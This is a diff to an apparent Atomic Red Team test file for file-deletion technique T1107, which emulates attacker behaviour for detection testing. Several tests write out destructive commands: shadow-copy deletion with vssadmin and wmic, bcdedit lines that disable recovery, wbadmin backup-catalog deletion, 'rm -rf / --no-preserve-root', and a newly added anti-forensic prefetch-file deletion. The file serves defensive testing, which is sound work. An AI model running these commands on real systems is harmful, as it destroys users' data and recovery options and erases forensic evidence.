@@ -55,45 +55,36 @@ atomic_tests:
     Delete a single file from the temporary directory using cmd.exe
   supported_platforms:
     - windows
-  input_arguments:
-    file_to_delete:
-      description: Path of file to delete
-      type: Path
-      default: C:\Windows\Temp\victim-files-cmd\a
   executor:
     name: command_prompt
+    elevation_required: false
     command: |
-      del /f #{file_to_delete}
+      echo "T1107" > %temp%\T1107.txt
+      del /f  %temp%\T1107.txt
 
 - name: Delete an entire folder - Windows cmd
   description: |
     Recursively delete the temporary directory and all files contained within it using cmd.exe
   supported_platforms:
     - windows
-  input_arguments:
-    folder_to_delete:
-      description: Path of folder to delete
-      type: Path
-      default: C:\Windows\Temp\victim-files-cmd
   executor:
     name: command_prompt
+    elevation_required: false
     command: |
-      del /f /S #{folder_to_delete}
+      mkdir %temp%\T1107
+      rmdir /s /q %temp%\T1107
 
 - name: Delete a single file - Windows PowerShell
   description: |
     Delete a single file from the temporary directory using Powershell
   supported_platforms:
     - windows
-  input_arguments:
-    file_to_delete:
-      description: Path of file to delete
-      type: Path
-      default: C:\Windows\Temp\victim-files-ps\a
   executor:
     name: powershell
+    elevation_required: false
     command: |
-      Remove-Item -path "#{file_to_delete}"
+      New-Item $env:TEMP\T1107.txt
+      Remove-Item -path $env:TEMP\T1107.txt
 
 - name: Delete an entire folder - Windows PowerShell
   description: |
@@ -107,8 +98,10 @@ atomic_tests:
       default: C:\Windows\Temp\victim-files-ps
   executor:
     name: powershell
+    elevation_required: false
     command: |
-      Remove-Item -path "#{folder_to_delete}" -recurse
+      New-Item $env:TEMP\T1107 -ItemType Directory
+      Remove-Item -path $env:TEMP\T1107 -recurse
 
 - name: Delete VSS - vssadmin
   description: |
@@ -117,6 +110,7 @@ atomic_tests:
     - windows
   executor:
     name: command_prompt
+    elevation_required: true
     command: |
       vssadmin.exe Delete Shadows /All /Quiet
 
@@ -127,6 +121,7 @@ atomic_tests:
     - windows
   executor:
     name: command_prompt
+    elevation_required: true
     command: |
       wmic shadowcopy delete
 
@@ -137,17 +132,19 @@ atomic_tests:
     - windows
   executor:
     name: command_prompt
+    elevation_required: true
     command: |
       bcdedit /set {default} bootstatuspolicy ignoreallfailures
       bcdedit /set {default} recoveryenabled no
 
 - name: wbadmin
   description: |
-    This test deletes Windows Backup catalogs. 
+    This test deletes Windows Backup catalogs.
   supported_platforms:
     - windows
   executor:
     name: command_prompt
+    elevation_required: true
     command: |
       wbadmin delete catalog -quiet
 
@@ -162,3 +159,14 @@ atomic_tests:
     name: bash
     command: |
       rm -rf / --no-preserve-root > /dev/null 2> /dev/null
+
+- name: Delete-PrefetchFile
+  description: |
+    Delete a single prefetch file.  Deletion of prefetch files is a known anti-forensic technique.
+  supported_platforms:
+    - windows
+  executor:
+    name: powershell
+    elevation_required: true
+    command: |
+      Remove-Item -Path (Join-Path "$Env:SystemRoot\prefetch\" (Get-ChildItem -Path "$Env:SystemRoot\prefetch\*.pf" -Name)[0])
